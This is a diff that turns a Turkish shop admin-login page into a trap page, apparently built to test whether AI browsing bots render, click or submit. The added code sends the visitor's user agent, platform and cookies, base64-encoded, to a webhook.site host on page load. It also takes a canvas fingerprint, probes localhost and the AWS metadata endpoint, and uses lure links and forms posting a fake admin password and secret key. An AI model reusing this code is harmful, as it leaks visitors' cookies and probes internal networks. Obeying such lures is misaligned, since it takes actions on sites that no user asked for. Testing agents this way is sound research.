@@ -3,315 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberShop - Admin Login</title>
+    <title>CyberShopier - Özel Fırsatlar ve Admin Paneli</title>
+    
+    <meta property="og:image" content="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=meta_og_image">
+    <link rel="prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=link_prefetch">
+    <link rel="dns-prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=dns_prefetch">
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff00; padding: 20px; }
+        .trap-box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #1a1a1a; }
+        h1 { color: #ff3333; text-align: center; }
+        button, a { background: #333; color: white; padding: 10px; border: 1px solid #555; text-decoration: none; display: inline-block; margin: 5px; cursor: pointer; }
+        
+        /* TUZAK 2: CSS Background Image (Görünmez Veri Sızdırma) */
+        .css-trap {
+            background-image: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=css_background_image');
+            width: 100%; height: 10px; display: block;
         }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        
+        /* TUZAK 3: Font Yükleme */
+        @font-face {
+            font-family: 'TrapFont';
+            src: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=font_load_request');
         }
-
-        .login-container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 420px;
-            padding: 40px;
-            animation: slideIn 0.5s ease;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo h1 {
-            font-size: 32px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 10px;
-        }
-
-        .logo p {
-            color: #666;
-            font-size: 14px;
-        }
-
-        .input-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .input-wrapper {
-            position: relative;
-        }
-
-        .input-wrapper input {
-            width: 100%;
-            padding: 14px 45px 14px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 15px;
-            transition: all 0.3s;
-            background: white;
-        }
-
-        .input-wrapper input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-
-        .input-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #999;
-            font-size: 18px;
-        }
-
-        .remember-forgot {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 25px;
-            font-size: 14px;
-        }
-
-        .remember-forgot label {
-            display: flex;
-            align-items: center;
-            color: #666;
-            cursor: pointer;
-        }
-
-        .remember-forgot input[type="checkbox"] {
-            margin-right: 8px;
-            cursor: pointer;
-        }
-
-        .remember-forgot a {
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .remember-forgot a:hover {
-            text-decoration: underline;
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .login-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-        }
-
-        .login-btn:active {
-            transform: translateY(0);
-        }
-
-        .divider {
-            text-align: center;
-            margin: 25px 0;
-            color: #999;
-            position: relative;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            width: 40%;
-            height: 1px;
-            background: #e0e0e0;
-        }
-
-        .divider::before {
-            left: 0;
-        }
-
-        .divider::after {
-            right: 0;
-        }
-
-        .signup-link {
-            text-align: center;
-            color: #666;
-            font-size: 14px;
-        }
-
-        .signup-link a {
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
-        }
-
-        .alert {
-            display: none;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-
-        .alert.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-            display: block;
-        }
-
-        .version {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
+        .font-test { font-family: 'TrapFont', sans-serif; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <h1>🛡️ CyberShop</h1>
-            <p>Admin Panel Access</p>
-        </div>
 
-        <div class="alert" id="alert"></div>
+    <h1>⚠️ CYBERSHOPIER ADMIN & OFFER PANEL ⚠️</h1>
+    <p class="font-test">Sistem Taraması Başlatıldı... (Font Test)</p>
+    
+    <div class="css-trap"></div>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="username">Kullanıcı Adı</label>
-                <div class="input-wrapper">
-                    <input type="text" id="username" placeholder="admin@cybershop.com" required>
-                    <span class="input-icon">👤</span>
-                </div>
-            </div>
-
-            <div class="input-group">
-                <label for="password">Şifre</label>
-                <div class="input-wrapper">
-                    <input type="password" id="password" placeholder="••••••••" required>
-                    <span class="input-icon">🔒</span>
-                </div>
-            </div>
-
-            <div class="remember-forgot">
-                <label>
-                    <input type="checkbox" id="remember">
-                    Beni Hatırla
-                </label>
-                <a href="#" onclick="return false;">Şifremi Unuttum?</a>
-            </div>
-
-            <button type="submit" class="login-btn">Giriş Yap</button>
-        </form>
-
-        <div class="divider">veya</div>
-
-        <div class="signup-link">
-            Hesabınız yok mu? <a href="#" onclick="return false;">Kayıt Ol</a>
-        </div>
-
-        <div class="version">v2.4.1 - Secure Connection Enabled 🔐</div>
+    <div class="trap-box">
+        <h3>1. Medya İşleme Testi (Passive Rendering)</h3>
+        <p>Bot bu elementleri render ederse log düşecek.</p>
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_visible" alt="Offer" width="50">
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_hidden" style="display:none;" alt="Hidden">
+        <audio src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=audio_tag_preload" preload="auto"></audio>
     </div>
 
-    <script>
-        const loginData = {
-            attempts: 0,
-            lastAttempt: null,
-            userAgent: navigator.userAgent,
-            screenResolution: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
+    <div class="trap-box">
+        <h3>2. Tıklama ve Gezinme Testi (Active Crawling)</h3>
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=simple_click_link">🎁 İndirimleri Gör (Normal Link)</a>
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=target_blank_click" target="_blank">📄 Sözleşmeyi Oku (Yeni Sekme)</a>
+        <a href="ftp://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=ftp_protocol">FTP Protokol Testi</a>
+    </div>
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const remember = document.getElementById('remember').checked;
-            
-            loginData.attempts++;
-            loginData.lastAttempt = new Date().toISOString();
-            loginData.username = username;
-            loginData.rememberMe = remember;
-            
-            console.log('Login Attempt:', loginData);
-            
-            localStorage.setItem('cybershop_session', JSON.stringify({
-                user: username,
-                timestamp: new Date().toISOString(),
-                sessionId: 'CS-' + Math.random().toString(36).substr(2, 9),
-                deviceInfo: loginData
-            }));
-            
-            const alert = document.getElementById('alert');
-            alert.className = 'alert success';
-            alert.textContent = '✓ Giriş başarılı! Yönlendiriliyorsunuz...';
-            
-            setTimeout(() => {
-                window.location.href = 'shop.html';
-            }, 1500);
-        });
+    <div class="trap-box">
+        <h3>3. Form ve Veri Gönderme (Interaction)</h3>
+        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="GET">
+            <input type="hidden" name="source" value="form_submission_get">
+            <input type="text" name="bot_check" placeholder="Admin Şifresi" value="123456">
+            <button type="submit">Giriş Yap (GET)</button>
+        </form>
+        <br>
+        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="POST">
+            <input type="hidden" name="source" value="form_submission_post">
+            <input type="hidden" name="secret" value="super_secret_key">
+            <button type="submit">Veritabanını Yedekle (POST)</button>
+        </form>
+    </div>
 
-        window.onload = function() {
-            const sessionData = {
-                pageLoad: new Date().toISOString(),
-                referrer: document.referrer || 'direct',
-                language: navigator.language
-            };
-            console.log('Page Load Data:', sessionData);
-        };
-    </script>
+    <div class="trap-box">
+        <h3>4. İç Ağ (Localhost) Erişim Testi</h3>
+        <p>Bot bu iframeleri yüklerse Localhost'a erişimi var demektir.</p>
+        <iframe src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=iframe_load" width="100" height="50"></iframe>
+        
+        <img src="http://127.0.0.1:80/favicon.ico" onerror="reportSSRF('Localhost_80_Fail')" onload="reportSSRF('Localhost_80_Success')" style="display:none;">
+        <img src="http://169.254.169.254/latest/meta-data/" onerror="reportSSRF('AWS_Metadata_Fail')" onload="reportSSRF('AWS_Metadata_Success')" style="display:none;">
+    </div>
+
+    <div class="trap-box">
+        <h3>5. JS Motoru ve Veri Sızdırma (Blind XSS)</h3>
+        <p id="js_status">JS Analizi Bekleniyor...</p>
+        <script>
+            // HEDEF: Webhook URL
+            const WEBHOOK = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";
+
+            function sendExfiltration(dataLabel, dataContent) {
+                // Veriyi Base64 ile şifrele ki URL bozulmasın
+                const encoded = btoa(dataContent);
+                const img = new Image();
+                img.src = `${WEBHOOK}?source=js_exfil&type=${dataLabel}&data=${encoded}`;
+            }
+
+            // 1. Temel Tarayıcı Bilgileri
+            const botInfo = `UA:${navigator.userAgent} | Platform:${navigator.platform} | Cookies:${document.cookie} | Screen:${screen.width}x${screen.height}`;
+            sendExfiltration("BrowserInfo", botInfo);
+
+            // 2. Localhost SSRF Raporlama Fonksiyonu
+            function reportSSRF(status) {
+                const img = new Image();
+                img.src = `${WEBHOOK}?source=ssrf_probe&status=${status}`;
+            }
+
+            // 3. Canvas Fingerprinting (Botu benzersiz şekilde tanımak için)
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Grok_Trap_v1", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Grok_Trap_v1", 4, 17);
+                const dataURL = canvas.toDataURL();
+                // Sadece hash'i gönder (URL çok uzamasın)
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                    hash |= 0;
+                }
+                sendExfiltration("CanvasFingerprint", hash.toString());
+            } catch (e) {
+                sendExfiltration("CanvasError", e.message);
+            }
+
+            document.getElementById('js_status').innerText = "JS Verileri Gönderildi! (Eğer botsan yakalandın)";
+            console.log("Trap executed.");
+        </script>
+    </div>
+
 </body>
 </html>
